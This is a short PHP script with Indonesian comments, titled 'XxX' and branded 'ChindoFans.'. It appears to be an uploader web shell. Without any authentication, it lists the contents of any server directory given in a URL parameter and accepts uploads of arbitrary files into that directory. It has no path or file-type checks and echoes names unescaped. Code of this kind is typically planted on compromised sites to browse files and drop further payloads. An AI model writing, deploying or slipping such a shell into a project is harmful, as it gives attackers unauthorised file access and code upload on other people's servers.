<?php
$directory = isset($_GET['dir']) ? $_GET['dir'] : getcwd(); // Mendapatkan path direktori dari parameter URL atau direktori saat ini

// Fungsi untuk mendapatkan daftar file dalam direktori
function getFilesInDirectory($directory) {
    $files = [];
    if ($handle = opendir($directory)) {
        while (false !== ($file = readdir($handle))) {
            if ($file != "." && $file != "..") {
                $files[] = $file;
            }
        }
        closedir($handle);
    }
    return $files;
}

// Fungsi untuk memindahkan file yang diunggah ke direktori tujuan
function moveUploadedFile($source, $destination) {
    if (move_uploaded_file($source, $destination)) {
        return true;
    } else {
        return false;
    }
}

// Memperbarui daftar file jika ada pengiriman formulir
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['uploaded_file'])) {
        $file = $_FILES['uploaded_file'];
        $file_name = $file['name'];
        $file_tmp = $file['tmp_name'];
        $destination = $directory . '/' . $file_name;

        if (moveUploadedFile($file_tmp, $destination)) {
            echo "File berhasil terupload! => " . $destination;
        } else {
            echo "File gagal terupload :(";
        }
    }
}

// Mendapatkan daftar file dalam direktori
$files = getFilesInDirectory($directory);
?>

<!DOCTYPE html>
<html>
<head>
    <title>XxX</title>
</head>
<body>
	<h2>ChindoFans.</h2>
    <h3>Direktori Saat Ini: <?php echo $directory; ?></h3>

    <h3>Daftar File:</h3>
    <ul>
        <?php foreach ($files as $file) { ?>
            <li><?php echo $file; ?></li>
        <?php } ?>
    </ul>

    <h3>Unggah File:</h3>
    <form action="" method="POST" enctype="multipart/form-data">
        <input type="file" name="uploaded_file">
        <button type="submit">Unggah</button>
    </form>

    <h3>Ganti Direktori:</h3>
    <form action="" method="GET">
        <input type="text" name="dir" placeholder="Masukkan path direktori">
        <button type="submit">Go</button>
    </form>
</body>
</html>
